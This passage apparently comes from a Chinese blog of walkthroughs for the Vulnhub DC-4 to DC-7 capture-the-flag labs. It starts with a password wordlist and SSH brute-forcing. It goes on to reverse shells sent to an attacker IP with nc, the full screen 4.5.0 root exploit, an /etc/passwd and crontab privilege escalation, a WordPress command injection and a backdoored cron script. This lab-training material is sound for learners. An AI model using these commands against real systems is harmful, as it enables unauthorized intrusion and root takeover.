monkey
123321
dragon
654321
666666
123
myspace1
a123456
121212
1qaz2wsx
123qwe
123abc
tinkle
target123
gwerty
1g2w3e4r
gwerty123
zag12wsx
7777777
qwerty1
1q2w3e4r
987654321
222222
qwe123
qwerty123
zxcvbnm
555555
112233
fuckyou
asdfghjkl
12345a
123123123
1q2w3e
qazwsx
loveme1
juventus
jennifer1
!~!1
bubbles
samuel
fuckoff
lovers
cheese1
0123456
123asd
999999999
madison
elizabeth1
music
buster1
lauren
david1
tigger1
123qweasd
taylor1
carlos
tinkerbell
samantha1
Sojdlg123aljg
joshua1
poop
stella
myspace123
asdasd5
freedom1
whatever1
xxxxxx
00000
valentina
a1b2c3
741852963
austin
monica
qaz123
lovely1
music1
harley1
family1
spongebob1
steven
nirvana
1234abcd
hellokitty
thomas1
cooper
520520
muffin
christian1
love13
fucku2
arsenal1
lucky7
diablo
apples
george1
babyboy1
crystal
1122334455
player1
aa123456
vfhbyf
forever1
Password
winston
chivas1
sexy
hockey1
1a2b3c4d
pussy
playboy1
stalker
cherry
tweety
toyota
creative
gemini
pretty1
maverick
brittany1
nathan1
letmein1
cameron1
secret1
google1
heaven
martina
murphy
spongebob
uQA9Ebw445
fernando
pretty
startfinding
softball
dolphin1
fuckme
test123
qwerty1234
kobe24
alejandro
adrian
september
aaaaaa1
bubba1
isabella
abc123456
password3
jason1
abcdefg123
loveyou1
shannon
100200
manuel
leonardo
molly1
flowers
123456z
007007
password.
321321
miguel
samsung1
sergey
sweet1
abc1234
windows
qwert123
vfrcbv
poohbear
d123456
school1
badboy
951753
123456c
111
steven1
snoopy1
garfield
YAgjecc826
compaq
candy1
sarah1
qwerty123456
123456l
eminem1
141414
789789
maria
steelers
iloveme1
morgan1
winner
boomer
lolita
nastya
alexis1
carmen
angelo
nicholas1
portugal
precious
jackass1
jonathan1
yfnfif
bitch
tiffany
rabbit
rainbow1
angel123
popcorn
barbara
brandy
starwars1
barney
natalia
jibril04
hiphop
tiffany1
shorty
poohbear1
simone
albert
marlboro
hardcore
cowboys
sydney
alex
scorpio
1234512345
q12345
qq123456
onelove
bond007
abcdefg1
eagles
crystal1
azertyuiop
winter
sexy12
angelina
james
svetlana
fatima
123456k
icecream
popcorn1</code></pre><p>生成爆破字典，爆破ssh<br>使用hydra，进行爆破,hydra是著名黑客组织thc的一款开源的暴力密码破解工具，可以在线破解多种密码。 </p>
<pre><code>破解ssh： 
hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip ssh 
hydra -l 用户名 -p 密码字典 -t 线程 -o save.log -vV ip ssh 
破解ftp： 
hydra ip ftp -l 用户名 -P 密码字典 -t 线程(默认16) -vV 
hydra ip ftp -l 用户名 -P 密码字典 -e ns -vV </code></pre><pre><code>爆破ssh
hydra -l jim -P passwd.txt -t 10 ssh://192.168.124.148</code></pre><h3 id="爆出ssh登录密码"><a href="#爆出ssh登录密码" class="headerlink" title="爆出ssh登录密码"></a>爆出ssh登录密码</h3><pre><code>Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-11-10 08:38:19
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 10 tasks per 1 server, overall 10 tasks, 252 login tries (l:1/p:252), ~26 tries per task
[DATA] attacking ssh://192.168.124.148:22/
[STATUS] 110.00 tries/min, 110 tries in 00:01h, 142 to do in 00:02h, 10 active



[STATUS] 80.00 tries/min, 160 tries in 00:02h, 92 to do in 00:02h, 10 active                                                      
[22][ssh] host: 192.168.124.148   login: jim   password: jibril04                                                                 
1 of 1 target successfully completed, 1 valid password found                                                                      
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-11-10 08:41:16</code></pre><p>ssh账号:jim密码:jibril04</p>
<p><img src="/images/pasted-189.png" alt="upload successful"></p>
<h3 id="提示有个mail"><a href="#提示有个mail" class="headerlink" title="提示有个mail"></a>提示有个mail</h3><p>读取一下信封</p>
<pre><code>/var/mail/jim</code></pre><p>告诉了我们账号密码<br><img src="/images/pasted-190.png" alt="upload successful"></p>
<pre><code>Password is:  ^xHhA&amp;hvim0y

See ya,
Charles</code></pre><p>切换一下用户</p>
<pre><code>su charles</code></pre><p>查看能够root执行的命令</p>
<pre><code>sudo -l</code></pre><p><img src="/images/pasted-191.png" alt="upload successful"><br>发有能够以root执行的teehee命令,而teehee的作用是可以向文件中追加内容</p>
<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><h4 id="将账号写入-etc-passwd中"><a href="#将账号写入-etc-passwd中" class="headerlink" title="将账号写入/etc/passwd中"></a>将账号写入/etc/passwd中</h4><p>密码设置为空</p>
<pre><code>echo &quot;admin::0:0:::/bin/bash&quot; | sudo teehee -a /etc/passwd</code></pre><p>对于admin::0:0:::/bin/bash的解释</p>
<pre><code>[用户名]：[密码]：[UID]：[GID]：[身份描述]：[主目录]：[登录shell]</code></pre><p><a href="https://www.cnblogs.com/backlion/p/10503978.html" target="_blank" rel="noopener">参考文章</a><br><img src="/images/pasted-192.png" alt="upload successful"><br>也可以不将密码设置为空</p>
<pre><code>mkpasswd -m SHA-512 12345</code></pre><p><img src="/images/pasted-195.png" alt="upload successful"><br>然后</p>
<pre><code>sudo teehee -a /etc/passwd 12345:$6$OXVv4N3qtVc0LQeI$CPmgAD9tTpzpCu86IaC9gIx6MYta8/huc3utEd3WwyhUWSbDxKIwi/3XCAHjOqn.rT/lamYZTxbKDoJXkxXaa1:0:0:::/bin/bash</code></pre><p>其中-e 类似等于&gt;&gt;<br>然后切换用户<br><img src="/images/pasted-196.png" alt="upload successful"><br><img src="/images/pasted-197.png" alt="upload successful"></p>
<pre><code>cat /root/flag.txt</code></pre><pre><code>
888       888          888 888      8888888b.                             888 888 888 888 
888   o   888          888 888      888  &quot;Y88b                            888 888 888 888 
888  d8b  888          888 888      888    888                            888 888 888 888 
888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888 
888d88888b888 d8P  Y8b 888 888      888    888 d88&quot;&quot;88b 888 &quot;88b d8P  Y8b 888 888 888 888 
88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P 
8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      &quot;   &quot;   &quot;   &quot;  
888P     Y888  &quot;Y8888  888 888      8888888P&quot;   &quot;Y88P&quot;  888  888  &quot;Y8888  888 888 888 888 


Congratulations!!!

Hope you enjoyed DC-4.  Just wanted to send a big thanks out there to all those
who have provided feedback, and who have taken time to complete these little
challenges.

If you enjoyed this CTF, send me a tweet via @DCAU7.
</code></pre><h5 id="写入定时文件-etc-crontab"><a href="#写入定时文件-etc-crontab" class="headerlink" title="写入定时文件/etc/crontab"></a>写入定时文件/etc/crontab</h5><p>向/etc/crontab文件中写入新的定时任务</p>
<p>时间部分全部填写为*，意思是每分钟执行一次，通过写入将/bin/sh的权限修改为4777，这样就可以在非root用户下执行它，并且执行期间拥有root权限。</p>
<pre><code>sudo teehee /etc/crontab
* * * * * root chmod 4777 /bin/sh</code></pre><p><img src="/images/pasted-198.png" alt="upload successful"></p>
<h3 id="参考文章-3"><a href="#参考文章-3" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://www.anquanke.com/post/id/178658#h3-5" target="_blank" rel="noopener">安全客</a></p>
<p><a href="https://www.cnblogs.com/yurang/p/13721862.html" target="_blank" rel="noopener">https://www.cnblogs.com/yurang/p/13721862.html</a></p>
<h2 id="DC5"><a href="#DC5" class="headerlink" title="DC5"></a>DC5</h2><h3 id="基本环境的搭建"><a href="#基本环境的搭建" class="headerlink" title="基本环境的搭建"></a>基本环境的搭建</h3><p>靶机下载地址：<a href="https://download.vulnhub.com/dc/DC-5.zip" target="_blank" rel="noopener">https://download.vulnhub.com/dc/DC-5.zip</a></p>
<h3 id="基本信息收集-3"><a href="#基本信息收集-3" class="headerlink" title="基本信息收集"></a>基本信息收集</h3><pre><code>nmap -sS -A 192.168.124.0/24</code></pre><pre><code>Nmap scan report for 192.168.124.149
Host is up (0.00027s latency).
Not shown: 998 closed ports
PORT    STATE SERVICE VERSION
80/tcp  open  http    nginx 1.6.2
|_http-server-header: nginx/1.6.2
|_http-title: Welcome
111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          37412/udp   status
|   100024  1          49448/tcp6  status
|   100024  1          49885/udp6  status
|_  100024  1          56530/tcp   status
MAC Address: 00:0C:29:1A:8C:74 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.27 ms 192.168.124.149

Nmap scan report for 192.168.124.254</code></pre><p>发现开了80,111端口，操作系统是linux，nginx 1.6.2<br>对端口进一步探测</p>
<pre><code>nmap -sS 192.168.124.149 -p 1-65535</code></pre><pre><code>Nmap scan report for 192.168.124.149
Host is up (0.00089s latency).
Not shown: 65532 closed ports
PORT      STATE SERVICE
80/tcp    open  http
111/tcp   open  rpcbind
56530/tcp open  unknown
MAC Address: 00:0C:29:1A:8C:74 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 2.46 seconds</code></pre><p>开了56530端口<br>进入80端口查看<br><img src="/images/pasted-199.png" alt="upload successful"></p>
<h3 id="发现一个留言功能"><a href="#发现一个留言功能" class="headerlink" title="发现一个留言功能"></a>发现一个留言功能</h3><p>尝试了xss发现并没有<br>扫描一下目录，发现特别的footer.php<br><img src="/images/pasted-200.png" alt="upload successful"><br>访问发现日期总在变<br><img src="/images/pasted-201.png" alt="upload successful"><br>发现留言的地方的日期也总在变<br><img src="/images/pasted-202.png" alt="upload successful"><br>然后thankyou.php应该是包含了footer.php页面<br>尝试文件包含读取thankyou.php文件和其他文件，发现能够成功读取</p>
<p><img src="/images/pasted-204.png" alt="upload successful"><br><img src="/images/pasted-203.png" alt="upload successful"><br>尝试写入文件进行文件包含，能写入的文件像中间件日志文件，ssh登录的日志文件，临时文件等等<br>参考之前的文件包含<a href="https://lnng.top/posts/6b68.html">https://lnng.top/posts/6b68.html</a><br>这个还是尝试包含中间件的日志文件吧，因为ssh的登录端口不知，且其他的方法不好利用<br>随便访问一个木马<br><img src="/images/pasted-205.png" alt="upload successful"><br>蚁剑连接发现连接成功<br><img src="/images/pasted-206.png" alt="upload successful"></p>
<h3 id="反弹交互shell"><a href="#反弹交互shell" class="headerlink" title="反弹交互shell"></a>反弹交互shell</h3><p>在/var/tmp/下新建phpshell文件，写入</p>
<pre><code>&lt;?php
system(&quot;nc 192.168.124.139 4444 -e /bin/sh&quot;);
?&gt;</code></pre><p>kali端</p>
<pre><code>nc -l -p 4444</code></pre><p>反弹shell</p>
<pre><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></pre><p><img src="/images/pasted-207.png" alt="upload successful"></p>
<h3 id="提权-1"><a href="#提权-1" class="headerlink" title="提权"></a>提权</h3><p>尝试suid提权</p>
<pre><code>find / -perm -u=s -type f 2&gt;/dev/null</code></pre><p><img src="/images/pasted-208.png" alt="upload successful"><br>GNU Screen是一款由GNU计划开发的用于命令行终端切换的自由软件。用户可以通过该软件同时连接多个本地或远程的命令行会话，并在其间自由切换。<br>GNU Screen可以看作是窗口管理器的命令行界面版本。它提供了统一的管理多个会话的界面和相应的功能。<br>搜索漏洞</p>
<pre><code>searchsploit screen 4.5.0</code></pre><p>发现两个可利用的漏洞<br><img src="/images/pasted-209.png" alt="upload successful"><br>使用第一个<br>先将41154.sh复制到桌面</p>
<pre><code>cp /usr/share/exploitdb/exploits/linux/local/41154.sh 41154.sh

cat 41154.sh</code></pre><pre><code>#!/bin/bash
# screenroot.sh
# setuid screen v4.5.0 local root exploit
# abuses ld.so.preload overwriting to get root.
# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html
# HACK THE PLANET
# ~ infodox (25/1/2017) 
echo &quot;~ gnu/screenroot ~&quot;
echo &quot;[+] First, we create our shell and library...&quot;
cat &lt;&lt; EOF &gt; /tmp/libhax.c
#include &lt;stdio.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;unistd.h&gt;
__attribute__ ((__constructor__))
void dropshell(void){
    chown(&quot;/tmp/rootshell&quot;, 0, 0);
    chmod(&quot;/tmp/rootshell&quot;, 04755);
    unlink(&quot;/etc/ld.so.preload&quot;);
    printf(&quot;[+] done!\n&quot;);
}
EOF
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
rm -f /tmp/libhax.c
cat &lt;&lt; EOF &gt; /tmp/rootshell.c
#include &lt;stdio.h&gt;
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp(&quot;/bin/sh&quot;, NULL, NULL);
}
EOF
gcc -o /tmp/rootshell /tmp/rootshell.c
rm -f /tmp/rootshell.c
echo &quot;[+] Now we create our /etc/ld.so.preload file...&quot;
cd /etc
umask 000 # because
screen -D -m -L ld.so.preload echo -ne  &quot;\x0a/tmp/libhax.so&quot; # newline needed
echo &quot;[+] Triggering...&quot;
screen -ls # screen itself is setuid, so... </code></pre><p>这里告诉了我们使用方法<br>先将第一部分写入libhax.c文件中</p>
<pre><code>#include &lt;stdio.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;unistd.h&gt;
__attribute__ ((__constructor__))
void dropshell(void){
    chown(&quot;/tmp/rootshell&quot;, 0, 0);
    chmod(&quot;/tmp/rootshell&quot;, 04755);
    unlink(&quot;/etc/ld.so.preload&quot;);
    printf(&quot;[+] done!\n&quot;);
}</code></pre><p>然后编译</p>
<pre><code>gcc -fPIC -shared -ldl -o libhax.so libhax.c</code></pre><p><img src="/images/pasted-210.png" alt="upload successful"><br>将中间的代码存入rootshell.c中</p>
<pre><code>#include &lt;stdio.h&gt;
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp(&quot;/bin/sh&quot;, NULL, NULL);
}</code></pre><p>然后编译</p>
<pre><code>gcc -o rootshell rootshell.c</code></pre><p><img src="/images/pasted-211.png" alt="upload successful"><br>将剩余代码保存到dc5.sh</p>
<pre><code>echo &quot;[+] Now we create our /etc/ld.so.preload file...&quot;
cd /etc
umask 000 # because
screen -D -m -L ld.so.preload echo -ne  &quot;\x0a/tmp/libhax.so&quot; # newline needed
echo &quot;[+] Triggering...&quot;
screen -ls # screen itself is setuid, so...
/tmp/rootshell</code></pre><p>并输入:</p>
<pre><code>set ff=unix</code></pre><p><img src="/images/pasted-212.png" alt="upload successful"><br>将三个文件上传到/tmp文件中<br>然后修改dc5.sh的权限</p>
<pre><code>chmod 777 dc5.sh</code></pre><p>然后执行</p>
<pre><code>./dc5.sh</code></pre><p><img src="/images/pasted-213.png" alt="upload successful"><br>读取flag<br><img src="/images/pasted-214.png" alt="upload successful"></p>
<pre><code>cat thisistheflag.txt                                                                                                             


888b    888 d8b                                                      888      888 888 888                                         
8888b   888 Y8P                                                      888      888 888 888                                         
88888b  888                                                          888      888 888 888                                         
888Y88b 888 888  .d8888b .d88b.       888  888  888  .d88b.  888d888 888  888 888 888 888                                         
888 Y88b888 888 d88P&quot;   d8P  Y8b      888  888  888 d88&quot;&quot;88b 888P&quot;   888 .88P 888 888 888                                         
888  Y88888 888 888     88888888      888  888  888 888  888 888     888888K  Y8P Y8P Y8P                                         
888   Y8888 888 Y88b.   Y8b.          Y88b 888 d88P Y88..88P 888     888 &quot;88b  &quot;   &quot;   &quot;                                          
888    Y888 888  &quot;Y8888P &quot;Y8888        &quot;Y8888888P&quot;   &quot;Y88P&quot;  888     888  888 888 888 888                                         




Once again, a big thanks to all those who do these little challenges,
and especially all those who give me feedback - again, it&#39;s all greatly
appreciated.  :-)

I also want to send a big thanks to all those who find the vulnerabilities
and create the exploits that make these challenges possible.</code></pre><h3 id="参考文章-4"><a href="#参考文章-4" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://www.jianshu.com/p/8f6e1e4d44b9" target="_blank" rel="noopener">https://www.jianshu.com/p/8f6e1e4d44b9</a><br><a href="https://www.anquanke.com/post/id/178958" target="_blank" rel="noopener">https://www.anquanke.com/post/id/178958</a></p>
<h2 id="DC6"><a href="#DC6" class="headerlink" title="DC6"></a>DC6</h2><h3 id="基本环境搭建-1"><a href="#基本环境搭建-1" class="headerlink" title="基本环境搭建"></a>基本环境搭建</h3><p> 靶机下载地址:<a href="https://download.vulnhub.com/dc/DC-6.zip" target="_blank" rel="noopener">https://download.vulnhub.com/dc/DC-6.zip</a></p>
<h3 id="基本信息收集-4"><a href="#基本信息收集-4" class="headerlink" title="基本信息收集"></a>基本信息收集</h3><pre><code> nmap -sS -A 192.168.124.0/24</code></pre><pre><code> Nmap scan report for 192.168.124.150
Host is up (0.00049s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 3e:52:ce:ce:01:b6:94:eb:7b:03:7d:be:08:7f:5f:fd (RSA)
|   256 3c:83:65:71:dd:73:d7:23:f8:83:0d:e3:46:bc:b5:6f (ECDSA)
|_  256 41:89:9e:85:ae:30:5b:e0:8f:a4:68:71:06:b4:15:ee (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Did not follow redirect to http://wordy/
|_https-redirect: ERROR: Script execution failed (use -d to debug)
MAC Address: 00:0C:29:4C:2C:9C (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.49 ms 192.168.124.150</code></pre><p>发现开放了80，22ssh端口，操作系统linux<br>对端口进一步扫描</p>
<pre><code>nmap -sS 192.168.124.150 -p 1-65535</code></pre><pre><code>Not shown: 65533 closed ports                                                                                                     
PORT   STATE SERVICE                                                                                                              
22/tcp open  ssh                                                                                                                  
80/tcp open  http                                                                                                                     </code></pre><p>没有新的端口<br>爆破一下ssh(爆破未成功)</p>
<pre><code>nmap --script=ssh-brute 192.168.124.150</code></pre><h3 id="访问80端口-1"><a href="#访问80端口-1" class="headerlink" title="访问80端口"></a>访问80端口</h3><p>发现80端口访问不了，被重定向的wordy页面和之前一样<br>修改本地的dns</p>
<pre><code>linux:
vim /etc/hosts
windows:
C:\Windows\System32\drivers\etc</code></pre><p>添加</p>
<pre><code>192.168.124.150 wordy</code></pre><p>根据个人ip<br>插件识别是一个wordpress+apache环境<br><img src="/images/pasted-236.png" alt="upload successful"><br>那和之前一样用wpscan扫描</p>
<pre><code>wpscan --url http://wordy/ --enumerate u</code></pre><p>扫描出几个用户名</p>
<p><img src="/images/pasted-237.png" alt="upload successful"><br>将其保存到usename.txt文件<br>然后有个提示妈耶鬼能想到<br>提示地址:<a href="https://www.vulnhub.com/entry/dc-6,315/" target="_blank" rel="noopener">https://www.vulnhub.com/entry/dc-6,315/</a><br><img src="/images/pasted-238.png" alt="upload successful"></p>
<pre><code>cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; password.txt</code></pre><p>然后进行爆破</p>
<pre><code>wpscan --url http://wordy/ -U username.txt -P password.txt</code></pre><p><img src="/images/pasted-240.png" alt="upload successful"><br>成功爆破出账号和密码</p>
<pre><code>mark / helpdesk01</code></pre><p>登录地址</p>
<pre><code>http://wordy/wp-admin/</code></pre><p><img src="/images/pasted-241.png" alt="upload successful"><br>搜索漏洞:<br><a href="https://www.exploit-db.com/exploits/45274" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/45274</a></p>
<p>发现一个命令执行，漏洞地址<br><a href="http://wordy/wp-admin/admin.php?page=plainview_activity_monitor&tab=activity_tools" target="_blank" rel="noopener">http://wordy/wp-admin/admin.php?page=plainview_activity_monitor&amp;tab=activity_tools</a><br><img src="/images/pasted-242.png" alt="upload successful"><br>kali开启监听端口</p>
<pre><code>netcat -l -p 4444</code></pre><p>这个位置修改命令执行反弹shell<br><img src="/images/pasted-243.png" alt="upload successful"></p>
<pre><code>baidu.com | nc -e /bin/bash 192.168.124.139 4444</code></pre><p>反弹一下交互shell</p>
<pre><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></pre><p><img src="/images/pasted-245.png" alt="upload successful"></p>
<h3 id="提权-2"><a href="#提权-2" class="headerlink" title="提权"></a>提权</h3><p>在家目录发现提示的ssh登录</p>
<pre><code>/home/mark/stuff</code></pre><p>发现登录账号密码</p>
<pre><code>Things to do:

- Restore full functionality for the hyperdrive (need to speak to Jens)
- Buy present for Sarah&#39;s farewell party
- Add new user: graham - GSo7isUM1D4 - done
- Apply for the OSCP course
- Buy new laptop for Sarah&#39;s replacement</code></pre><p>ssh登录<br><img src="/images/pasted-246.png" alt="upload successful"><br>尝试suid提取,发现没有可利用的</p>
<pre><code>find / -perm -u=s -type f 2&gt;/dev/null</code></pre><p>查看当前用户可执行操作</p>
<pre><code>sudo -l                                                                                    </code></pre><p><img src="/images/pasted-247.png" alt="upload successful"><br>发现可操作/home/jens/backups.sh，打开发现是一个解压的脚本<br><img src="/images/pasted-248.png" alt="upload successful"><br>向其中写入命令然后已jens来执行</p>
<pre><code>echo &quot;/bin/bash&quot; &gt;&gt; /home/jens/backups.sh
sudo -u jens /home/jens/backups.sh</code></pre><p><img src="/images/pasted-249.png" alt="upload successful"></p>
<p>发现成功切换到jens用户<br>继续查看可执行的命令,发现可执行的root的nmap</p>
<pre><code>sudo -l</code></pre><p><img src="/images/pasted-250.png" alt="upload successful"><br>所以需要nmap打开一个shell即可获得root</p>
<p>nmap中执行shell方法</p>
<pre><code>echo &quot;os.execute(&#39;/bin/bash&#39;)&quot;&gt;/tmp/shell.nse
sudo nmap --script=/tmp/shell.nse</code></pre><pre><code>cat ./theflag.txt</code></pre><p>成功获得flag</p>
<pre><code>Yb        dP 888888 88     88         8888b.   dP&quot;Yb  88b 88 888888 d8b 
 Yb  db  dP  88__   88     88          8I  Yb dP   Yb 88Yb88 88__   Y8P 
  YbdPYbdP   88&quot;&quot;   88  .o 88  .o      8I  dY Yb   dP 88 Y88 88&quot;&quot;   `&quot;&#39; 
   YP  YP    888888 88ood8 88ood8     8888Y&quot;   YbodP  88  Y8 888888 (8) 


Congratulations!!!

Hope you enjoyed DC-6.  Just wanted to send a big thanks out there to all those
who have provided feedback, and who have taken time to complete these little
challenges.

If you enjoyed this CTF, send me a tweet via @DCAU7.</code></pre><h2 id="DC7"><a href="#DC7" class="headerlink" title="DC7"></a>DC7</h2><h3 id="基本环境搭建-2"><a href="#基本环境搭建-2" class="headerlink" title="基本环境搭建"></a>基本环境搭建</h3><p>靶机下载地址:<a href="https://download.vulnhub.com/dc/DC-7.zip" target="_blank" rel="noopener">https://download.vulnhub.com/dc/DC-7.zip</a></p>
<h3 id="基本信息收集-5"><a href="#基本信息收集-5" class="headerlink" title="基本信息收集"></a>基本信息收集</h3><pre><code>nmap -sS -A 192.168.124.0/24</code></pre><pre><code>Nmap scan report for 192.168.124.151
Host is up (0.00037s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 d0:02:e9:c7:5d:95:32:ab:10:99:89:84:34:3d:1e:f9 (RSA)
|   256 d0:d6:40:35:a7:34:a9:0a:79:34:ee:a9:6a:dd:f4:8f (ECDSA)
|_  256 a8:55:d5:76:93:ed:4f:6f:f1:f7:a1:84:2f:af:bb:e1 (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-generator: Drupal 8 (https://www.drupal.org)
| http-robots.txt: 22 disallowed entries (15 shown)
| /core/ /profiles/ /README.txt /web.config /admin/ 
| /comment/reply/ /filter/tips /node/add/ /search/ /user/register/ 
| /user/password/ /user/login/ /user/logout/ /index.php/admin/ 
|_/index.php/comment/reply/
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Welcome to DC-7 | D7
MAC Address: 00:0C:29:52:A9:5B (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.37 ms 192.168.124.151</code></pre><p>发现开放了22，80端口系统linux，进一步扫描，没发现其他端口</p>
<pre><code>nmap 192.168.124.151 -p 1-65535</code></pre><p>爆破ssh</p>
<pre><code>nmap --script=ssh-brute 192.168.124.151</code></pre><p>查看80端口进行进一步信息的探测CMS是Drupal8，而且告诉我们不是暴力破解<br><img src="/images/pasted-251.png" alt="upload successful"></p>
<h3 id="查找漏洞"><a href="#查找漏洞" class="headerlink" title="查找漏洞"></a>查找漏洞</h3><p>尝试了msf中的漏洞不行exploit-db中根据版本来也不行<br>百度一下说这个提示搜索一下这个人，然后发现了github，然后找到了源码<a href="https://github.com/Dc7User/staffdb" target="_blank" rel="noopener">github源码地址</a><br><img src="/images/pasted-252.png" alt="upload successful"><br><img src="/images/pasted-253.png" alt="upload successful"><br>然后我们在config.php中发现了连接数据库的账号密码，尝试使用ssh连接,可以看到爆破前面爆破账号密码失败</p>
<pre><code>&lt;?php
    $servername = &quot;localhost&quot;;
    $username = &quot;dc7user&quot;;
    $password = &quot;MdR3xOgB7#dW&quot;;
    $dbname = &quot;Staff&quot;;
    $conn = mysqli_connect($servername, $username, $password, $dbname);
?&gt;</code></pre><p><img src="/images/pasted-254.png" alt="upload successful"></p>
<h3 id="提取"><a href="#提取" class="headerlink" title="提取"></a>提取</h3><p>先搜寻一下文件的基本信息,在mbox中发现一个root执行的文件(百度的妈耶看不到)</p>
<pre><code>cat mbox</code></pre><p><img src="/images/pasted-255.png" alt="upload successful"></p>
<pre><code>cat /opt/scripts/backups.sh
#!/bin/bash
rm /home/dc7user/backups/*
cd /var/www/html/
drush sql-dump --result-file=/home/dc7user/backups/website.sql
cd ..
tar -czf /home/dc7user/backups/website.tar.gz html/
gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.sql
gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.tar.gz
chown dc7user:dc7user /home/dc7user/backups/*
rm /home/dc7user/backups/website.sql
rm /home/dc7user/backups/website.tar.gz</code></pre><p>发现应该是一个备份的sh脚本<br>看一下权限www-data和root都是有权限的<br><img src="/images/pasted-256.png" alt="upload successful"><br>所以有思路了，如果我们获得www-data的权限向这个脚本执行任务，那么我们就可以反弹root权限，因为会以root权限定时启动<br>看着这个备份脚本可以发现是一个drush配置的命令，它可以改变用户名密码</p>
<pre><code>drush sql-dump --result-file=/home/dc7user/backups/website.sql</code></pre><p>所以尝试修改一下密码</p>
<pre><code>cd /var/www/html
drush user-password admin --password=&quot;123456&quot;</code></pre><p><img src="/images/pasted-257.png" alt="upload successful"><br>登录尝试，登录成功<br><img src="/images/pasted-258.png" alt="upload successful"><br>发现这个位置是支持扩展的，所以我们想要创建一个webshell可以借助插件，看wp要去下载一个php的插件<br><img src="/images/pasted-259.png" alt="upload successful"><br>插件下载地址：<a href="https://www.drupal.org/project/php" target="_blank" rel="noopener">https://www.drupal.org/project/php</a><br>下载gz格式上传，然后点如图的标识<br><img src="/images/pasted-260.png" alt="upload successful"><br>然后勾上下图的东西，点击最下方的install<br><img src="/images/pasted-261.png" alt="upload successful"><br>回到主页，点击下图的东西，创建一个文章<br><img src="/images/pasted-262.png" alt="upload successful"></p>
<p><img src="/images/pasted-263.png" alt="upload successful"><br>随便写个木马<br><img src="/images/pasted-265.png" alt="upload successful"><br>注意下面的text format要选择php code<br>然后蚁剑连接即可<br><img src="/images/pasted-266.png" alt="upload successful"><br>再反弹给kali吧，其实可以直接再webshell中反弹shell<br><img src="/images/pasted-267.png" alt="upload successful"><br>反弹交互shell</p>
<pre><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></pre><p>然后将反弹shell的脚本写入定时启动的sh中，反弹root的shell</p>
<pre><code>echo &quot;nc -e /bin/bash 192.168.124.139 7777&quot; &gt;&gt;  /opt/scripts/backups.sh</code></pre><p><img src="/images/pasted-268.png" alt="upload successful"><br>读取flag</p>
<pre><code>cd /root
ls
theflag.txt
cat theflag.txt

888       888          888 888      8888888b.                             888 888 888 888 
888   o   888          888 888      888  &quot;Y88b                            888 888 888 888 
888  d8b  888          888 888      888    888                            888 888 888 888 
888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888 
888d88888b888 d8P  Y8b 888 888      888    888 d88&quot;&quot;88b 888 &quot;88b d8P  Y8b 888 888 888 888 
88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P 
8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      &quot;   &quot;   &quot;   &quot;  
888P     Y888  &quot;Y8888  888 888      8888888P&quot;   &quot;Y88P&quot;  888  888  &quot;Y8888  888 888 888 888 


Congratulations!!!

